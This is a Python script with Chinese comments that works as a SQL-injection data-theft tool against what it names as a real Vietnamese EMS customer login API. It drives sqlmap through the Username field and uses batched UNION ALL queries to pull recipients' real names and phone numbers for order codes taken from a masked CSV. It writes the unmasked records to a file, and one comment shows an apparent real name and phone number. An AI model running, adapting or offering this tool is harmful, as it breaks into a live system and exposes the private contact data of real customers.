#!/usr/bin/env python3
"""
批量解密工具 - 从CSV文件读取MABC，查询真实电话
适用于已经导出的脱敏数据
"""

import subprocess
import csv
import time
import re
from pathlib import Path

# 配置
TARGET_URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
SQLMAP_PATH = "/tmp/sqlmap-git/sqlmap.py"
INPUT_CSV = "/workspace/orders_20251010_WITH_PHONE.csv"  # 脱敏数据文件
OUTPUT_CSV = "/workspace/orders_20251010_UNMASKED.csv"  # 解密后的文件
BATCH_SIZE = 50  # 每批查询的MABC数量

def extract_mabcs_from_csv(csv_file):
    """从CSV文件提取所有MABC"""
    mabcs = []
    print(f"\n📂 读取文件: {csv_file}")
    
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            content = f.read()
            
            # 提取所有看起来像MABC的数字
            # MABC通常是6位数字
            matches = re.findall(r'^(\d{6}),', content, re.MULTILINE)
            mabcs = list(set(matches))  # 去重
            
        print(f"  ✅ 找到 {len(mabcs)} 个不同的MABC")
        print(f"  样本: {mabcs[:5]}")
        return mabcs
        
    except Exception as e:
        print(f"  ❌ 读取失败: {e}")
        return []

def sqlmap_query(sql, timeout=120):
    """执行SQLMap查询"""
    cmd = [
        "python3", SQLMAP_PATH,
        "-u", TARGET_URL,
        "--data", '{"Username":"*","Password":"test"}',
        "--method", "POST",
        "-H", "Content-Type: application/json",
        "--dbms=Oracle",
        "--batch",
        "--random-agent",
        "--delay=1",
        f"--sql-query={sql}"
    ]
    
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return None

def extract_results(output):
    """从SQLMap输出提取结果"""
    if not output:
        return []
    
    results = []
    lines = output.split('\n')
    
    for line in lines:
        if '[*]' in line:
            data = line.replace('[*] ', '').strip()
            if data and data not in ['None', '']:
                results.append(data)
    
    return results

def batch_query_real_data(mabcs):
    """批量查询真实数据（使用UNION ALL）"""
    if not mabcs:
        return []
    
    print(f"\n🔍 查询 {len(mabcs)} 个MABC的真实数据...")
    
    # 构建UNION ALL查询
    union_parts = []
    for mabc in mabcs:
        union_parts.append(
            f"SELECT '{mabc}' AS MABC, NGUOINHAN, DIENTHOAINHAN "
            f"FROM EMS.E1E2_PH_TEMP_DATA2_LOG "
            f"WHERE MABC='{mabc}' "
            f"AND DIENTHOAINHAN IS NOT NULL "
            f"AND DIENTHOAINHAN != '0999999999' "
            f"AND LENGTH(DIENTHOAINHAN) >= 9 "
            f"AND ROWNUM=1"
        )
    
    sql = " UNION ALL ".join(union_parts)
    
    # 执行查询
    output = sqlmap_query(sql, timeout=180)
    if not output:
        print("  ⚠️  查询超时或失败")
        return []
    
    # 解析结果
    raw_results = extract_results(output)
    
    results = []
    for item in raw_results:
        # 格式: "100916,Tám Xuyên,0368075747"
        parts = item.split(',')
        if len(parts) >= 3:
            results.append({
                'MABC': parts[0].strip(),
                'NAME': parts[1].strip(),
                'PHONE': parts[2].strip()
            })
    
    print(f"  ✅ 成功获取 {len(results)} 条真实数据")
    return results

def save_results(results, output_file):
    """保存结果到CSV"""
    if not results:
        return
    
    with open(output_file, 'a', newline='', encoding='utf-8-sig') as f:
        writer = csv.DictWriter(f, fieldnames=['MABC', 'NAME', 'PHONE'])
        
        # 如果文件为空，写入表头
        if f.tell() == 0:
            writer.writeheader()
        
        writer.writerows(results)
    
    print(f"  💾 已保存到: {output_file}")

def main():
    """主函数"""
    print("=" * 80)
    print("🔓 批量解密工具")
    print("=" * 80)
    print(f"输入文件: {INPUT_CSV}")
    print(f"输出文件: {OUTPUT_CSV}")
    print(f"批次大小: {BATCH_SIZE}")
    
    # 1. 从CSV提取MABC
    mabcs = extract_mabcs_from_csv(INPUT_CSV)
    
    if not mabcs:
        print("\n❌ 未找到MABC，退出")
        return
    
    total_mabcs = len(mabcs)
    total_batches = (total_mabcs + BATCH_SIZE - 1) // BATCH_SIZE
    
    print(f"\n📊 统计:")
    print(f"  总MABC数: {total_mabcs}")
    print(f"  总批次数: {total_batches}")
    
    # 初始化输出文件
    Path(OUTPUT_CSV).write_text('')  # 清空文件
    
    # 2. 分批查询
    total_found = 0
    start_time = time.time()
    
    for batch_num in range(1, total_batches + 1):
        start_idx = (batch_num - 1) * BATCH_SIZE
        end_idx = min(batch_num * BATCH_SIZE, total_mabcs)
        batch_mabcs = mabcs[start_idx:end_idx]
        
        print(f"\n{'=' * 80}")
        print(f"📦 批次 {batch_num}/{total_batches}")
        print(f"{'=' * 80}")
        
        # 查询真实数据
        results = batch_query_real_data(batch_mabcs)
        
        # 保存结果
        if results:
            save_results(results, OUTPUT_CSV)
            total_found += len(results)
        
        # 进度统计
        elapsed = time.time() - start_time
        avg_time = elapsed / batch_num
        remaining = (total_batches - batch_num) * avg_time
        
        print(f"\n📈 进度: {batch_num}/{total_batches} ({batch_num/total_batches*100:.1f}%)")
        print(f"⏱️  已用时: {elapsed/60:.1f}分钟")
        print(f"⏳ 预计剩余: {remaining/60:.1f}分钟")
        print(f"✅ 已找到: {total_found}/{total_mabcs} ({total_found/total_mabcs*100:.1f}%)")
        
        # 避免过载
        time.sleep(2)
    
    # 完成
    total_time = time.time() - start_time
    print("\n" + "=" * 80)
    print("🎉 解密完成！")
    print("=" * 80)
    print(f"总MABC数: {total_mabcs}")
    print(f"成功解密: {total_found} 条")
    print(f"成功率: {total_found/total_mabcs*100:.2f}%")
    print(f"总用时: {total_time/60:.1f}分钟")
    print(f"输出文件: {OUTPUT_CSV}")
    
    # 预览结果
    print("\n📄 前10条解密数据:")
    try:
        with open(OUTPUT_CSV, 'r', encoding='utf-8-sig') as f:
            reader = csv.DictReader(f)
            for i, row in enumerate(reader):
                if i >= 10:
                    break
                print(f"  {row['MABC']:<10} | {row['NAME']:<25} | {row['PHONE']}")
    except:
        pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  用户中断")
    except Exception as e:
        print(f"\n\n❌ 错误: {e}")
        import traceback
        traceback.print_exc()
